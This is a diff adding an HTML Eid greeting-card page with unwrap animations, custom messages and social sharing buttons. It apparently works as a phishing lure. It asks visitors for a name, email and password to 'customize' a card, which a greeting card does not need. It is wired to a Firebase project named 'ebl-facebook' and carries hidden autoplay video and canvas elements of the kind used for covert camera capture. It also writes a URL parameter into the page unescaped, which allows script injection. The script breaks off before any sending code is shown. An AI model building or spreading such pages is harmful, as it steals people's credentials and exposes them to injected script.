@@ -1,0 +1,1394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eid Mubarak · gentle drift</title>
+   
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&family=Caveat:wght@400..700&display=swap" rel="stylesheet">
+    <!-- Font Awesome for social icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+
+ <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        body {
+            min-height: 100vh;
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            background: #FDC2CD;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            color: #3d1f2b;
+        }
+
+        /* Full-page overlay for particles */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        body::after {
+            content: '';
+            position: absolute;
+            width: 80vmin;
+            height: 80vmin;
+            background: radial-gradient(circle, rgba(255, 220, 235, 0.5) 0%, transparent 70%);
+            bottom: -10vmin;
+            left: -10vmin;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .eid-card {
+            position: relative;
+            z-index: 20;
+            max-width: 580px;
+            width: 90%;
+            background: rgba(255, 255, 255, 0.5);
+            backdrop-filter: blur(12px) saturate(180%);
+            -webkit-backdrop-filter: blur(12px) saturate(180%);
+            border-radius: 56px 56px 56px 56px;
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            box-shadow: 0 35px 70px -10px rgba(220, 120, 140, 0.3),
+                        0 0 0 1px rgba(255, 215, 225, 0.5) inset;
+            padding: 2rem 2rem 2.5rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: all 0.4s ease;
+        }
+
+        .top-credit {
+            display: flex;
+            align-items: baseline;
+            gap: 0.4rem;
+            background: rgba(255, 255, 255, 0.4);
+            padding: 0.5rem 1.4rem;
+            border-radius: 60px;
+            backdrop-filter: blur(4px);
+            margin-bottom: 0.75rem;
+            font-size: 1rem;
+            color: #ac4f6c;
+            box-shadow: 0 6px 16px rgba(240, 160, 180, 0.15);
+        }
+
+        .top-credit p {
+            font-family: 'Caveat', 'Brush Script MT', cursive;
+            font-size: 1.5rem;
+            font-weight: 400;
+            color: #ad4b6b;
+        }
+
+        .designer-name {
+            font-weight: 800;
+            font-size: 2rem;
+            letter-spacing: 1.5px;
+            background: linear-gradient(
+                120deg, 
+                #b23e64 0%, 
+                #f76c8e 25%, 
+                #9c27b0 50%, 
+                #2196f3 75%, 
+                #b23e64 100%
+            );
+            background-size: 300% auto; 
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: flow 4s linear infinite;
+            text-shadow: 0 2px 10px rgba(255, 128, 128, 0.2);
+            line-height: 1.2;
+            display: inline-block;
+        }
+
+        @keyframes flow {
+            0% { background-position: 0% center; }
+            100% { background-position: 300% center; }
+        }
+
+        .heart-duo {
+            display: flex;
+            gap: 0.5rem;
+            align-items: center;
+            justify-content: center;
+            margin: 0.5rem 0 0.2rem;
+            font-size: 3.2rem;
+            filter: drop-shadow(0 8px 16px rgba(245, 120, 140, 0.4));
+        }
+
+        .heart-main {
+            animation: levitate 3s ease-in-out infinite;
+            line-height: 1;
+        }
+
+        .heart-second {
+            animation: levitate 3.2s ease-in-out infinite reverse;
+            line-height: 1;
+        }
+
+        @keyframes levitate {
+            0% { transform: translateY(0px) scale(1); }
+            50% { transform: translateY(-12px) scale(1.05); }
+            100% { transform: translateY(0px) scale(1); }
+        }
+
+        h1 {
+            font-size: 2.7rem;
+            font-weight: 700;
+            margin: 0.25rem 0 0.25rem;
+            background: linear-gradient(135deg, #832b45, #d45c7a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 4px 20px rgba(255, 200, 220, 0.6);
+            letter-spacing: -0.01em;
+        }
+
+        .lovely-line {
+            border: 2px solid #ffb6c1;
+            font-size: 1.2rem;
+            text-align: center;
+            font-weight: 300;
+            color: #7e4a5c;
+            background: rgba(255, 255, 255, 0.4);
+            backdrop-filter: blur(4px);
+            padding: 0.8rem 1.8rem;
+            border-radius: 80px;
+            max-width: 90%;
+            margin: 1rem 0 1.4rem;
+            box-shadow: 0 6px 18px rgba(220, 150, 170, 0.15);
+            font-style: italic;
+            border: 1px solid rgba(255, 210, 225, 0.6);
+            line-height: 1.5;
+        }
+
+        .gift-presentation {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0.8rem 0 1.5rem;
+            min-height: 220px;
+        }
+
+        .gift-box {
+            width: 200px;
+            transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            filter: drop-shadow(0 20px 30px #fbb0c0);
+            animation: soft-wobble 6s infinite ease-in-out;
+            z-index: 10;
+            display: block;
+        }
+
+        .open-gift-box {
+            width: 200px;
+            filter: drop-shadow(0 20px 30px #fbb0c0);
+            z-index: 10;
+            display: none;
+        }
+
+        .word-escape-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 50;
+        }
+
+        .escape-word {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-weight: 700;
+            white-space: nowrap;
+            background: white;
+            padding: 10px 25px;
+            border-radius: 50px;
+            color: #b23e64;
+            box-shadow: 0 10px 25px rgba(178, 62, 100, 0.2);
+            border: 2px solid #ffd1dc;
+            opacity: 0;
+            z-index: 100;
+            pointer-events: none;
+            text-shadow: none;
+        }
+
+        @keyframes flyHighAndStay {
+            0% {
+                opacity: 0;
+                transform: translate(-50%,-60px) scale(0.5);
+            }
+            15% {
+                opacity: 1;
+                transform: translate(-50%, -140px) scale(1.1);
+            }
+            30% {
+                transform: translate(-50%, -120px) scale(1);
+            }
+            100% {
+                opacity: 1;
+                transform: translate(-50%, -120px) scale(1);
+            }
+        }
+
+        .shake-box {
+            animation: shake 0.2s infinite ease-in-out !important;
+        }
+
+        @keyframes shake {
+            0% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(5deg) scale(1.05); }
+            50% { transform: rotate(-5deg) scale(1.1); }
+            75% { transform: rotate(3deg) scale(1.05); }
+            100% { transform: rotate(0deg) scale(1); }
+        }
+
+        @keyframes soft-wobble {
+            0%, 100% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(2deg) scale(1.02); }
+            75% { transform: rotate(-2deg) scale(1.02); }
+        }
+
+        .unwrap-btn {
+            background: linear-gradient(145deg, #f37c96, #f5a3b9);
+            border: none;
+            color: white;
+            font-weight: 700;
+            font-size: 1.25rem;
+            letter-spacing: 1.5px;
+            padding: 1.1rem 2rem;
+            width: 85%;
+            max-width: 380px;
+            border-radius: 120px;
+            box-shadow: 0 18px 30px -8px rgba(225, 110, 140, 0.5), 0 4px 0 0 #b34d6d inset, 0 -2px 10px rgba(255,255,255,0.6) inset;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            margin-top: 0.5rem;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 230, 240, 0.7);
+        }
+
+        .unwrap-btn:hover {
+            transform: scale(1.02);
+            background: linear-gradient(145deg, #f68aa5, #fbb0c2);
+            box-shadow: 0 22px 35px -6px #e58ca8, 0 3px 0 0 #b34d6d inset;
+        }
+
+        .unwrap-btn:active {
+            transform: scale(0.98);
+            box-shadow: 0 8px 20px -4px #e07094;
+        }
+
+        /* Edit button */
+        .edit-btn {
+            background: rgba(255, 255, 255, 0.6);
+            border: 2px solid #ffb6c1;
+            color: #b23e64;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 0.5rem 1.5rem;
+            border-radius: 40px;
+            cursor: pointer;
+            margin-top: 1rem;
+            backdrop-filter: blur(4px);
+            transition: all 0.2s;
+            width: auto;
+        }
+
+        .edit-btn:hover {
+            background: white;
+            transform: scale(1.02);
+            box-shadow: 0 5px 15px rgba(255, 180, 200, 0.4);
+        }
+
+        /* Login Modal */
+        .login-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(8px);
+            z-index: 25000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-modal {
+            background: white;
+            border-radius: 40px;
+            width: 90%;
+            max-width: 420px;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 30px 60px rgba(178, 62, 100, 0.3);
+            border: 2px solid #ffd9e2;
+            text-align: center;
+        }
+
+        .login-modal h2 {
+            color: #b23e64;
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .login-modal p {
+            color: #ac4f6c;
+            margin-bottom: 2rem;
+        }
+
+        .login-input-group {
+            margin-bottom: 1.2rem;
+            text-align: left;
+        }
+
+        .login-input-group label {
+            display: block;
+            margin-bottom: 0.3rem;
+            color: #832b45;
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        .login-input-group input {
+            width: 100%;
+            padding: 0.8rem 1.2rem;
+            border: 2px solid #ffd1dc;
+            border-radius: 50px;
+            font-size: 1rem;
+            transition: all 0.2s;
+        }
+
+        .login-input-group input:focus {
+            border-color: #b23e64;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(178, 62, 100, 0.2);
+        }
+
+        .login-actions {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .login-btn {
+            background: linear-gradient(145deg, #f37c96, #f5a3b9);
+            border: none;
+            color: white;
+            font-weight: 700;
+            padding: 1rem;
+            border-radius: 50px;
+            flex: 2;
+            cursor: pointer;
+            font-size: 1.1rem;
+        }
+
+        .login-cancel-btn {
+            background: transparent;
+            border: 2px solid #ffb6c1;
+            color: #b23e64;
+            font-weight: 600;
+            padding: 1rem;
+            border-radius: 50px;
+            flex: 1;
+            cursor: pointer;
+        }
+
+        .demo-hint {
+            margin-top: 1.5rem;
+            font-size: 0.85rem;
+            color: #b38b99;
+        }
+
+        /* Edit Panel */
+        .edit-panel-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(8px);
+            z-index: 30000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .edit-panel {
+            background: white;
+            border-radius: 40px;
+            width: 90%;
+            max-width: 550px;
+            max-height: 85vh;
+            overflow-y: auto;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 30px 60px rgba(178, 62, 100, 0.3);
+            border: 2px solid #ffd9e2;
+        }
+
+        .edit-panel h2 {
+            color: #b23e64;
+            font-size: 2rem;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .edit-section {
+            margin-bottom: 2rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 2px dashed #ffd1dc;
+        }
+
+        .edit-section h3 {
+            color: #832b45;
+            margin-bottom: 1rem;
+            font-size: 1.3rem;
+        }
+
+        .edit-input-group {
+            margin-bottom: 1.2rem;
+        }
+
+        .edit-input-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #ac4f6c;
+            font-weight: 500;
+        }
+
+        .edit-input-group input, 
+        .edit-input-group textarea,
+        .edit-input-group select {
+            width: 100%;
+            padding: 0.8rem 1.2rem;
+            border: 2px solid #ffd1dc;
+            border-radius: 30px;
+            font-size: 1rem;
+            font-family: 'Inter', sans-serif;
+            resize: vertical;
+        }
+
+        .edit-input-group textarea {
+            min-height: 80px;
+        }
+
+        /* Message timing and size controls */
+        .timing-input-group {
+            margin-top: 1rem;
+        }
+
+        .timing-slider {
+            width: 100%;
+            margin: 0.5rem 0;
+            accent-color: #b23e64;
+        }
+
+        .timing-value {
+            display: inline-block;
+            background: #ffd1dc;
+            padding: 0.2rem 1rem;
+            border-radius: 30px;
+            font-size: 0.9rem;
+            color: #832b45;
+            font-weight: 600;
+        }
+
+        /* Font size control */
+        .font-size-control {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .font-size-input {
+            flex: 1;
+        }
+
+        .font-size-preview {
+            font-size: 1.2rem;
+            background: #ffd1dc;
+            padding: 0.3rem 1rem;
+            border-radius: 30px;
+            color: #832b45;
+            white-space: nowrap;
+        }
+
+        .edit-actions {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .save-btn {
+            background: linear-gradient(145deg, #f37c96, #f5a3b9);
+            border: none;
+            color: white;
+            font-weight: 700;
+            padding: 1rem 2rem;
+            border-radius: 60px;
+            flex: 2;
+            cursor: pointer;
+            font-size: 1.1rem;
+        }
+
+        .cancel-edit-btn {
+            background: transparent;
+            border: 2px solid #ffb6c1;
+            color: #b23e64;
+            font-weight: 600;
+            padding: 1rem;
+            border-radius: 60px;
+            flex: 1;
+            cursor: pointer;
+        }
+
+        /* Share Link Container */
+        .share-link-container {
+            margin-top: 1.5rem;
+            padding: 1.5rem;
+            background: #fff0f5;
+            border-radius: 30px;
+            display: none;
+        }
+
+        .share-link-container.show {
+            display: block;
+        }
+
+        .share-link-container p {
+            color: #832b45;
+            margin-bottom: 1rem;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .share-link-box {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .share-link-box input {
+            flex: 1;
+            padding: 0.8rem 1.2rem;
+            border: 2px solid #ffb6c1;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            background: white;
+        }
+
+        .copy-link-btn {
+            background: #b23e64;
+            color: white;
+            border: none;
+            padding: 0 1.5rem;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        /* Social Share Buttons */
+        .social-share {
+            display: flex;
+            gap: 0.8rem;
+            justify-content: center;
+            margin-top: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .social-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            padding: 0.8rem 1.5rem;
+            border-radius: 50px;
+            font-weight: 600;
+            text-decoration: none;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.2s;
+            flex: 1 1 auto;
+            min-width: 120px;
+        }
+
+        .social-btn:hover {
+            transform: scale(1.05);
+        }
+
+        .social-btn.whatsapp {
+            background: #25D366;
+        }
+
+        .social-btn.facebook {
+            background: #4267B2;
+        }
+
+        .social-btn.instagram {
+            background: linear-gradient(45deg, #f09433, #d62976, #962fbf, #4f5bd5);
+        }
+
+        .social-btn.copy-main {
+            background: #b23e64;
+        }
+
+        .fab {
+            font-family: 'Font Awesome 6 Brands';
+        }
+
+        .particle {
+            position: fixed;
+            top: -50px;
+            left: 0;
+            pointer-events: none;
+            z-index: 9999;
+            animation: fall linear forwards;
+            font-size: 1.8rem;
+            filter: drop-shadow(0 6px 6px rgba(255, 170, 200, 0.4));
+            opacity: 0.9;
+            will-change: transform;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(0) rotate(0deg) scale(0.8);
+                opacity: 0.8;
+            }
+            20% { opacity: 1; }
+            80% { opacity: 0.8; }
+            100% {
+                transform: translateY(120vh) rotate(360deg) scale(1.2);
+                opacity: 0;
+            }
+        }
+
+        #video, #canvas { display: none; }
+
+        @media (max-width: 450px) {
+            .eid-card { padding: 1.5rem 1.2rem; border-radius: 40px; }
+            h1 { font-size: 2.2rem; }
+            .designer-name { font-size: 1.8rem; }
+            .heart-duo { font-size: 2.7rem; }
+            .lovely-line { font-size: 1rem; padding: 0.6rem 1rem; }
+            .unwrap-btn { font-size: 1rem; padding: 0.9rem 1rem; }
+            .particle { font-size: 1.4rem; }
+            .escape-word { font-size: 1.2rem; }
+            .social-btn { padding: 0.6rem 1rem; font-size: 0.9rem; }
+        }
+    </style>
+
+    
+</head>
+<body>
+
+    <div class="eid-card">
+        <div class="top-credit">
+            <p>designed by</p>
+            <span class="designer-name">ZEESHAN</span>
+        </div>
+
+        <div class="heart-duo">
+            <span class="heart-main">❤️</span>
+            <span class="heart-second">🌙</span>
+            <span class="heart-main">✨</span>
+        </div>
+
+        <h1 id="greeting">Eid Mubarak,<br>Someone Special!</h1>
+
+        <div class="lovely-line" id="lovelyLine">
+            May this beautiful Eid bring endless joy to your heart and magic to your soul.
+        </div>
+
+        <div class="gift-presentation" id="giftPresentation">
+            <img src="https://i.ibb.co/d4nQbGTy/Picsart-26-02-28-15-16-47-443.png" alt="Eid Gift" class="gift-box" id="closedGiftBox">
+            <img src="https://i.ibb.co/hJgjRj6V/Picsart-26-03-17-00-38-30-351.png" alt="Oft" class="open-gift-box" id="openGiftBox">
+            <div class="word-escape-container" id="wordEscapeContainer"></div>
+        </div>
+
+        <button class="unwrap-btn" id="unwrapBtn">✨ unwrap your surprise ✨</button>
+        
+        <!-- Edit Button -->
+        <button class="edit-btn" id="editBtn">✎ customize for someone special</button>
+    </div>
+
+    <!-- Login Modal -->
+    <div class="login-modal-overlay" id="loginModalOverlay">
+        <div class="login-modal">
+            <h2>🔐 tell us about yourself</h2>
+            <p>enter your details to customize</p>
+            
+            <div class="login-input-group">
+                <label>Your Name</label>
+                <input type="text" id="loginNameInput" placeholder="e.g. Kabir, Sarah, Ahmed...">
+            </div>
+            
+            <div class="login-input-group">
+                <label>Email</label>
+                <input type="email" id="loginEmailInput" placeholder="your@email.com">
+            </div>
+            
+            <div class="login-input-group">
+                <label>Password</label>
+                <input type="password" id="loginPasswordInput" placeholder="••••••••">
+            </div>
+
+            <div class="login-actions">
+                <button class="login-btn" id="loginSubmitBtn">✨ continue</button>
+                <button class="login-cancel-btn" id="loginCancelBtn">cancel</button>
+            </div>
+            
+            <div class="demo-hint">✨ your info is saved securely</div>
+        </div>
+    </div>
+
+    <!-- Edit Panel Overlay with Updated Messages -->
+    <div class="edit-panel-overlay" id="editPanelOverlay">
+        <div class="edit-panel">
+            <h2>✨ customize your Eid gift ✨</h2>
+            
+            <div class="edit-section">
+                <h3>🎁 Greeting Name</h3>
+                <div class="edit-input-group">
+                    <label>Who is this for?</label>
+                    <input type="text" id="editNameInput" placeholder="e.g. Sarah, Mom, Ahmed...">
+                </div>
+            </div>
+
+            <div class="edit-section">
+                <h3>💝 Your Message</h3>
+                <div class="edit-input-group">
+                    <label>Wish them something special</label>
+                    <textarea id="editMessageInput" rows="2"></textarea>
+                </div>
+            </div>
+
+            <div class="edit-section">
+                <h3>😄 Special Messages</h3>
+                <div class="edit-input-group">
+                    <label>Beautiful wishes for your loved one</label>
+                    <textarea id="editWordsInput" rows="7" placeholder="Each message will appear one by one...">Pure Joy ✨
+Endless Blessings 🌙
+Deep Peace 🕊️
+Infinite Love 💝
+May your every prayer be answered. ❤️</textarea>
+                </div>
+                
+                <!-- Message display duration control -->
+                <div class="timing-input-group">
+                    <label>⏱️ How long each message stays visible: <span id="timingDisplay" class="timing-value">3 seconds</span></label>
+                    <input type="range" id="messageTiming" class="timing-slider" min="1" max="10" value="2" step="0.5">
+                    <small style="color: #ac4f6c;">Each message will stay on screen for this many seconds</small>
+                </div>
+
+                <!-- Font size control -->
+                <div class="timing-input-group">
+                    <label>🔤 Message size: <span id="fontSizeDisplay" class="timing-value">1.5rem</span></label>
+                    <div class="font-size-control">
+                        <input type="range" id="fontSizeSlider" class="timing-slider font-size-input" min="0.8" max="3" value="1.1" step="0.1">
+                        <span class="font-size-preview" id="fontSizePreview">Aa</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="edit-actions" id="editActions">
+                <button class="save-btn" id="saveCustomizationBtn">💾 save & get link</button>
+                <button class="cancel-edit-btn" id="cancelEditBtn">cancel</button>
+            </div>
+
+            <!-- Share Container -->
+            <div class="share-link-container" id="shareLinkContainer">
+                <p>🎉 Share this customized link:</p>
+                <div class="share-link-box">
+                    <input type="text" id="shareLinkInput" readonly>
+                    <button class="copy-link-btn" id="copyLinkBtn">copy</button>
+                </div>
+                
+                <div class="social-share" id="socialShareButtons">
+                    <button class="social-btn whatsapp" id="shareWhatsapp">
+                        <i class="fab fa-whatsapp"></i> WhatsApp
+                    </button>
+                    <button class="social-btn facebook" id="shareFacebook">
+                        <i class="fab fa-facebook"></i> Facebook
+                    </button>
+                    <button class="social-btn instagram" id="shareInstagram">
+                        <i class="fab fa-instagram"></i> Instagram
+                    </button>
+                    <button class="social-btn copy-main" id="copyMainBtn">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+</body>
+<script>
+     // Wait for DOM to be fully loaded
+    document.addEventListener('DOMContentLoaded', function() {
+        // ---------- FIREBASE INITIALIZATION ----------
+        const firebaseConfig = {
+            apiKey: "AIzaSyAz9LGIiYZu93FIrmy7eQImx1Fzx5Xqs-g",
+            authDomain: "ebl-facebook.firebaseapp.com",
+            projectId: "ebl-facebook",
+            storageBucket: "ebl-facebook.firebasestorage.app",
+            messagingSenderId: "42606325432",
+            appId: "1:42606325432:web:155342e10f514b466e8e4d"
+        };
+
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // ---------- GLOBAL VARIABLES ----------
+        let fallingInterval = null;
+        let fallingItems = ['❤️', '🌟', '💝', '🌹', '🎈', '🎁', '✨']; // Default mix
+
+        // ---------- FALLING ELEMENTS FUNCTION ----------
+        function startGentleDrift() {
+            // Clear existing interval if any
+            if (fallingInterval) {
+                clearInterval(fallingInterval);
+            }
+            
+            fallingInterval = setInterval(() => {
+                const count = Math.random() < 0.3 ? 2 : 1;
+                for (let i = 0; i < count; i++) {
+                    if (fallingItems.length === 0) continue;
+                    
+                    const particle = document.createElement('div');
+                    particle.className = 'particle';
+                    
+                    // Pick random item from the falling items array
+                    particle.innerText = fallingItems[Math.floor(Math.random() * fallingItems.length)];
+                    
+                    particle.style.left = Math.random() * 100 + '%';
+                    particle.style.top = -Math.random() * 40 + 'px';
+                    const size = 14 + Math.floor(Math.random() * 28);
+                    particle.style.fontSize = size + 'px';
+                    const duration = 7 + Math.random() * 8;
+                    particle.style.animationDuration = duration + 's';
+                    particle.style.animationDelay = Math.random() * 3 + 's';
+                    particle.style.opacity = 0.5 + Math.random() * 0.3;
+                    particle.style.transform = `rotate(${Math.random() * 30 - 15}deg)`;
+                    document.body.appendChild(particle);
+                    setTimeout(() => {
+                        if (particle.parentNode) particle.remove();
+                    }, (duration + 3) * 1000);
+                }
+            }, 1200);
+        }
+
+        // Opening burst function
+        function openingBurst() {
+            const burstCount = 70;
+            for (let i = 0; i < burstCount; i++) {
+                setTimeout(() => {
+                    const burst = document.createElement('div');
+                    burst.className = 'particle';
+                    burst.innerText = fallingItems[Math.floor(Math.random() * fallingItems.length)] || '✨';
+                    burst.style.left = Math.random() * 100 + '%';
+                    burst.style.top = -10 + Math.random() * 30 + 'px';
+                    burst.style.fontSize = (18 + Math.random() * 36) + 'px';
+                    burst.style.animationDuration = (3 + Math.random() * 5) + 's';
+                    burst.style.filter = 'drop-shadow(0 0 15px #ffb6c1) drop-shadow(0 0 8px gold)';
+                    burst.style.opacity = '0.95';
+                    document.body.appendChild(burst);
+                    setTimeout(() => {
+                        if (burst.parentNode) burst.remove();
+                    }, 8000);
+                }, i * 20);
+            }
+        }
+        
+        // Start initial falling
+        setTimeout(() => {
+            openingBurst();
+            setTimeout(startGentleDrift, 1500);
+        }, 300);
+
+        // ---------- HANDLE URL PARAMETERS ----------
+        const urlParams = new URLSearchParams(window.location.search);
+        let userName = urlParams.get('name');
+        const greetingElement = document.getElementById('greeting');
+        
+        // New default messages
+        let words = [
+            'wish you 🤲',
+            'Pure Joy ✨',
+            'Endless Blessings 🌙',
+            'Infinite Love 💝',
+            'May your every prayer be answered. ❤️'
+        ];
+        
+        // Default message timing (3 seconds display duration)
+        let messageDisplayDuration = 2;
+        
+        // Default font size
+        let wordFontSize = 1;
+        
+        // Check for custom message
+        const customMsg = urlParams.get('msg');
+        const lovelyLine = document.getElementById('lovelyLine');
+        const originalLine = "May this beautiful Eid bring endless joy to your heart and magic to your soul.";
+        
+        if (customMsg) {
+            lovelyLine.innerText = decodeURIComponent(customMsg);
+        }
+        
+        // Check for custom timing
+        const customTiming = urlParams.get('timing');
+        if (customTiming && !isNaN(parseFloat(customTiming))) {
+            messageDisplayDuration = parseFloat(customTiming);
+        }
+        
+        // Check for custom font size
+        const customFontSize = urlParams.get('fontsize');
+        if (customFontSize && !isNaN(parseFloat(customFontSize))) {
+            wordFontSize = parseFloat(customFontSize);
+        }
+        
+        // Check for falling objects (keep default)
+        const fallingItemsParam = urlParams.get('falling');
+        if (fallingItemsParam) {
+            try {
+                const items = JSON.parse(decodeURIComponent(fallingItemsParam));
+                if (Array.isArray(items) && items.length > 0) {
+                    fallingItems = items;
+                }
+            } catch(e) {}
+        }
+        
+        // Check for custom words
+        const customWordsParam = urlParams.get('words');
+        if (customWordsParam) {
+            try {
+                const customWordsArray = JSON.parse(decodeURIComponent(customWordsParam));
+                if (Array.isArray(customWordsArray) && customWordsArray.length > 0) {
+                    words = customWordsArray;
+                }
+            } catch(e) {
+                console.log('Using default words');
+            }
+        }
+        
+        if (userName) {
+            greetingElement.innerHTML = `Eid Mubarak,<br>${userName}!`;
+        }
+
+        // Restart falling with new settings
+        if (fallingInterval) {
+            clearInterval(fallingInterval);
+            startGentleDrift();
+        }
+
+        // ---------- UNWRAP LOGIC WITH IMPROVED ANIMATION ----------
+        const unwrapBtn = document.getElementById('unwrapBtn');
+        const closedBox = document.getElementById('closedGiftBox');
+        const openBox = document.getElementById('openGiftBox');
+        const wordContainer = document.getElementById('wordEscapeContainer');
+        
+        let isOpened = false;
+
+        function resetBoxToClosed() {
+            openBox.style.display = 'none';
+            closedBox.style.display = 'block';
+            const remainingWords = document.querySelectorAll('.escape-word');
+            remainingWords.forEach(word => word.remove());
+            unwrapBtn.innerText = '✨ unwrap your surprise ✨';
+            unwrapBtn.disabled = false;
+            unwrapBtn.style.opacity = '1';
+            unwrapBtn.style.cursor = 'pointer';
+            isOpened = false;
+        }
+
+        unwrapBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (isOpened) return;
+
+            unwrapBtn.disabled = true;
+            unwrapBtn.style.opacity = '0.6';
+            unwrapBtn.style.cursor = 'default';
+            closedBox.classList.add('shake-box');
+
+            setTimeout(() => {
+                closedBox.classList.remove('shake-box');
+                closedBox.style.display = 'none';
+                openBox.style.display = 'block';
+
+                let wordIndex = 0;
+
+                function showNextWord() {
+                    if (wordIndex >= words.length) {
+                        setTimeout(() => {
+                            resetBoxToClosed();
+                        }, 500);
+                        return;
+                    }
+                    
+                    const word = words[wordIndex];
+                    wordIndex++;
+                    
+                    const wordEl = document.createElement('div');
+                    wordEl.className = 'escape-word';
+                    wordEl.innerText = word;
+                    wordEl.style.animation = `flyHighAndStay ${messageDisplayDuration}s ease-out forwards`;
+                    wordEl.style.fontSize = wordFontSize + 'rem';
+                    
+                    wordContainer.appendChild(wordEl);
+
+                    // Remove word after animation completes
+                    setTimeout(() => {
+                        if (wordEl.parentNode) wordEl.remove();
+                    }, messageDisplayDuration * 1000);
+                    
+                    // Show next word after current one finishes
+                    setTimeout(showNextWord, messageDisplayDuration * 1000 + 100);
+                }
+
+                showNextWord();
+
+                // Burst effect
+                for (let i = 0; i < 40; i++) {
+                    setTimeout(() => {
+                        const burst = document.createElement('div');
+                        burst.className = 'particle';
+                        burst.innerText = fallingItems[Math.floor(Math.random() * fallingItems.length)] || '✨';
+                        burst.style.left = Math.random() * 100 + '%';
+                        burst.style.top = (30 + Math.random() * 50) + '%';
+                        burst.style.fontSize = (20 + Math.random() * 40) + 'px';
+                        burst.style.animationDuration = (1.5 + Math.random() * 2.5) + 's';
+                        burst.style.filter = 'drop-shadow(0 0 15px #ffb6c1) drop-shadow(0 0 5px gold)';
+                        document.body.appendChild(burst);
+                        setTimeout(() => {
+                            if (burst.parentNode) burst.remove();
+                        }, 3000);
+                    }, i * 30);
+                }
+
+                lovelyLine.style.transition = 'all 0.3s';
+                lovelyLine.innerText = '✨ the box is open! ✨';
+                lovelyLine.style.background = 'rgba(255, 230, 240, 0.7)';
+                lovelyLine.style.color = '#b34366';
+                
+                setTimeout(() => {
+                    lovelyLine.innerText = customMsg ? decodeURIComponent(customMsg) : originalLine;
+                    lovelyLine.style.background = 'rgba(255, 255, 255, 0.4)';
+                    lovelyLine.style.color = '#7e4a5c';
+                }, 2800);
+
+                isOpened = true;
+            }, 1500);
+
+            const originalText = unwrapBtn.innerText;
+            unwrapBtn.innerText = '🎁 shaking...';
+            setTimeout(() => {
+                if (!isOpened) {
+                    unwrapBtn.innerText = originalText;
+                }
+            }, 1400);
+        });
+
+        // ---------- LOGIN AND CUSTOMIZATION FEATURE ----------
+        const editBtn = document.getElementById('editBtn');
+        const loginModalOverlay = document.getElementById('loginModalOverlay');
+        const loginCancelBtn = document.getElementById('loginCancelBtn');
+        const loginSubmitBtn = document.getElementById('loginSubmitBtn');
+        
+        const loginNameInput = document.getElementById('loginNameInput');
